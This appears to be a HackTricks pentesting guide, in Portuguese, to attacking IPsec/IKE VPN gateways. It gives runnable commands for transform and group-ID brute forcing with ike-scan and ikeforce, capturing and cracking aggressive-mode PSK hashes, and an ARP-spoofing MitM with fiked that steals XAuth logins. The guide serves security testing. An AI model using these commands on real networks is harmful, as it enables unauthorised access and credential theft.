# Informações Básicas

IPsec é a tecnologia mais comumente usada tanto para soluções de VPN empresarial gateway-to-gateway (LAN-to-LAN) quanto para host-to-gateway (acesso remoto).

**IKE é um tipo de implementação ISAKMP** (Internet Security Association Key Management Protocol), que é um framework para autenticação e troca de chaves. O IKE estabelece a associação de segurança (SA) entre dois pontos finais por meio de um processo de três fases:

* **Fase 1:** Estabelecer um canal seguro entre 2 pontos finais usando uma chave pré-compartilhada (PSK) ou certificados. Pode usar o modo principal (3 pares de mensagens) ou **modo agressivo**.
* **Fase 1.5:** Isso é opcional, é chamado de Fase de Autenticação Estendida e autentica o usuário que está tentando se conectar (usuário+senha).
* **Fase 2:** Negocia o parâmetro para a segurança dos dados usando ESP e AH. Pode usar um algoritmo diferente do usado na fase 1 (Perfect Forward Secrecy (PFS)).

**Porta padrão:** 500/udp

# **Descubra** o serviço usando nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
# **Encontrando uma transformação válida**

A configuração do IPSec pode ser preparada apenas para aceitar uma ou algumas transformações. Uma transformação é uma combinação de valores. **Cada transformação** contém um número de atributos como DES ou 3DES como o **algoritmo de criptografia**, SHA ou MD5 como o **algoritmo de integridade**, uma chave pré-compartilhada como o tipo de **autenticação**, Diffie-Hellman 1 ou 2 como o algoritmo de **distribuição de chave** e 28800 segundos como o **tempo de vida**.

Então, a primeira coisa que você tem que fazer é **encontrar uma transformação válida**, para que o servidor converse com você. Para fazer isso, você pode usar a ferramenta **ike-scan**. Por padrão, o Ike-scan funciona no modo principal e envia um pacote para o gateway com um cabeçalho ISAKMP e uma única proposta com **oito transformações dentro dela**.

Dependendo da resposta, você pode obter algumas informações sobre o endpoint:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
    HDR=(CKY-R=d90bf054d6b76401)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)
 
Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Como você pode ver na resposta anterior, há um campo chamado **AUTH** com o valor **PSK**. Isso significa que a VPN está configurada usando uma chave pré-compartilhada (e isso é realmente bom para um pentester).\
**O valor da última linha também é muito importante:**

* _0 handshake retornado; 0 notificação retornada:_ Isso significa que o alvo **não é um gateway IPsec**.
* _**1 handshake retornado; 0 notificação retornada:**_ Isso significa que o **alvo está configurado para IPsec e está disposto a realizar a negociação IKE, e uma ou mais das transformações que você propôs são aceitáveis** (uma transformação válida será mostrada na saída).
* _0 handshake retornado; 1 notificação retornada:_ Os gateways VPN respondem com uma mensagem de notificação quando **nenhuma das transformações é aceitável** (embora alguns gateways não o façam, nesse caso, uma análise adicional e uma proposta revisada devem ser tentadas).

Então, neste caso, já temos uma transformação válida, mas se você estiver no terceiro caso, precisará **fazer um pouco de força bruta para encontrar uma transformação válida:**

Em primeiro lugar, você precisa criar todas as transformações possíveis:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
E então fazer brute-force em cada um usando o ike-scan (isso pode levar vários minutos):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Se a força bruta não funcionou, talvez o servidor esteja respondendo sem apertos de mão mesmo para transformações válidas. Nesse caso, você pode tentar a mesma força bruta, mas usando o modo agressivo:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Felizmente, **uma transformação válida é ecoada de volta**.\
Você pode tentar **o mesmo ataque** usando [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Você também pode tentar forçar transformações com [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (109).png>)

No **Grupo DH: 14 = MODP de 2048 bits** e **15 = 3072 bits**\
**2 = HMAC-SHA = SHA1 (neste caso). O formato --trans é $Enc,$Hash,$Auth,$DH**

A Cisco recomenda evitar especialmente os grupos DH 1 e 2. Os autores do artigo descrevem como é provável que **estados-nação possam decifrar sessões IPsec negociadas usando grupos fracos via pré-computação de log discreto**. Os centenas de milhões de dólares gastos na pré-computação são amortizados através da decodificação em tempo real de qualquer sessão usando um grupo fraco (1.024 bits ou menor).

## Fingerprinting do servidor

Em seguida, você pode usar o ike-scan para tentar **descobrir o fornecedor** do dispositivo. A ferramenta envia uma proposta inicial e para de reproduzir. Em seguida, **analisa** a **diferença de tempo** entre as mensagens recebidas do servidor e o padrão de resposta correspondente, o pentester pode identificar com sucesso o fornecedor do gateway VPN. Além disso, alguns servidores VPN usarão a carga útil opcional **Vendor ID (VID) payload** com IKE.

**Especifique a transformação válida, se necessário** (usando --trans)

Se o IKE descobrir qual é o fornecedor, ele o imprimirá:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
    HDR=(CKY-R=4f3ec84731e2214a)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)
 
IKE Backoff Patterns:
 
IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator
 
Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Isso também pode ser alcançado com o script do nmap _**ike-version**_

# Encontrando o ID correto (nome do grupo)

Para poder capturar o hash, você precisa de uma transformação válida que suporte o modo Aggressive e o ID correto (nome do grupo). Provavelmente, você não saberá o nome do grupo válido, então terá que forçar a entrada.\
Para fazer isso, eu recomendaria 2 métodos:

## Forçando a entrada do ID com ike-scan

Primeiro, tente fazer uma solicitação com um ID falso tentando reunir o hash ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Se **nenhum hash for retornado**, provavelmente este método de força bruta funcionará. **Se algum hash for retornado, isso significa que um hash falso será enviado de volta para um ID falso, então este método não será confiável** para forçar a ID. Por exemplo, um hash falso pode ser retornado (isso acontece em versões modernas):

![](<../.gitbook/assets/image (110).png>)

Mas se, como eu disse, nenhum hash for retornado, você deve tentar forçar nomes de grupo comuns usando o ike-scan.

Este script **tentará forçar IDs possíveis** e retornará as IDs onde um handshake válido é retornado (este será um nome de grupo válido).

Se você descobriu uma transformação específica, adicione-a ao comando ike-scan. E se você descobriu várias transformações, sinta-se à vontade para adicionar um novo loop para tentar todas elas (você deve tentar todas até que uma delas esteja funcionando corretamente).

Você pode usar o [dicionário do ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ou [o do seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) de nomes de grupo comuns para forçá-los:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
## Bruteforçando ID com Iker

[**Iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) também usa o **ike-scan** para forçar possíveis nomes de grupo. Ele segue seu próprio método para **encontrar um ID válido com base na saída do ike-scan**.

## Bruteforçando ID com ikeforce

[**Ikeforce.py**](https://github.com/SpiderLabs/ikeforce) é uma ferramenta que pode ser usada para **forçar IDs também**. Esta ferramenta irá **tentar explorar diferentes vulnerabilidades** que poderiam ser usadas para **distinguir entre um ID válido e um não válido** (pode ter falsos positivos e falsos negativos, é por isso que prefiro usar o método ike-scan, se possível).

Por padrão, o **ikeforce** enviará no início alguns IDs aleatórios para verificar o comportamento do servidor e determinar a tática a ser usada.

* O **primeiro método** é forçar os nomes de grupo **procurando** pela informação **Dead Peer Detection DPD** dos sistemas Cisco (esta informação só é reproduzida pelo servidor se o nome do grupo estiver correto).

* O **segundo método** disponível é **verificar o número de respostas enviadas para cada tentativa** porque às vezes mais pacotes são enviados quando o ID correto é usado.

* O **terceiro método** consiste em **procurar por "INVALID-ID-INFORMATION" em resposta a um ID incorreto**.

* Finalmente, se o servidor não responder a nada às verificações, o **ikeforce** tentará forçar o servidor e verificar se, quando o ID correto é enviado, o servidor responde com algum pacote.\
  Obviamente, o objetivo de forçar o ID é obter o **PSK** quando você tem um ID válido. Então, com o **ID** e **PSK**, você terá que forçar o XAUTH (se estiver habilitado).

Se você descobriu uma transformação específica, adicione-a ao comando ikeforce. E se você descobriu várias transformações, sinta-se à vontade para adicionar um novo loop para tentar todas elas (você deve tentar todas até que uma delas esteja funcionando corretamente).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
## Sniffing ID

Também é possível obter nomes de usuário válidos ao capturar a conexão entre o cliente VPN e o servidor, já que o primeiro pacote do modo agressivo contendo o ID do cliente é enviado sem criptografia (do livro **Network Security Assessment: Know Your Network**)

![](<../.gitbook/assets/image (111).png>)

# Capturando e quebrando o hash

Por fim, se você encontrou uma **transformação válida** e o **nome do grupo** e se o **modo agressivo é permitido**, então você pode facilmente capturar o hash que pode ser quebrado:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
O hash será salvo dentro de _hash.txt_.

Você pode usar **psk-crack**, **john** (usando [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) e **hashcat** para **quebrar** o hash:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
# **XAuth**

A maioria das implementações usa o **modo agressivo IKE com PSK para realizar autenticação em grupo**, e **XAUTH para fornecer autenticação adicional do usuário** (por meio do Microsoft Active Directory, RADIUS ou similar). No **IKEv2**, **EAP substitui XAUTH** para autenticar usuários.

## MitM na rede local para capturar credenciais

Assim, você pode capturar os dados do login usando o _fiked_ e ver se há algum nome de usuário padrão (você precisa redirecionar o tráfego IKE para o `fiked` para sniffing, o que pode ser feito com a ajuda de ARP spoofing, [mais informações](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). O Fiked atuará como um ponto de extremidade VPN e capturará as credenciais XAuth:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
Além disso, usando IPSec, tente fazer um ataque de MitM e bloqueie todo o tráfego para a porta 500. Se o túnel IPSec não puder ser estabelecido, talvez o tráfego seja enviado sem criptografia.

## Forçando XAUTH username e senha com ikeforce

Para forçar o **XAUTH** (quando você conhece um nome de grupo válido **id** e o **psk**), você pode usar um nome de usuário ou uma lista de nomes de usuário e uma lista de senhas:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Desta forma, o ikeforce tentará se conectar usando cada combinação de nome de usuário:senha.

Se você encontrou uma ou várias transformações válidas, use-as como nos passos anteriores.

# Autenticação com uma VPN IPSEC

No Kali, o **VPNC** é usado para estabelecer túneis IPsec. Os **perfis** devem estar localizados em **_/etc/vpnc/_** e você pode usar a ferramenta _**vpnc**_ para chamá-los.\
Exemplo retirado do livro **Network Security Assessment 3rd Edition**:
```
root@kali:~# cat > /etc/vpnc/vpntest.conf << STOP
IPSec gateway 10.0.0.250
IPSec ID vpntest
IPSec secret groupsecret123
IKE Authmode psk
Xauth username chris
Xauth password tiffers1
STOP
root@kali:~# vpnc vpntest
VPNC started in background (pid: 6980)...
root@kali:~# ifconfig tun0
```
# Material de Referência

* [Artigo sobre cracking de PSK](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Escaneando uma Implementação VPN](http://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf)

# Shodan

* `port:500 IKE`


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
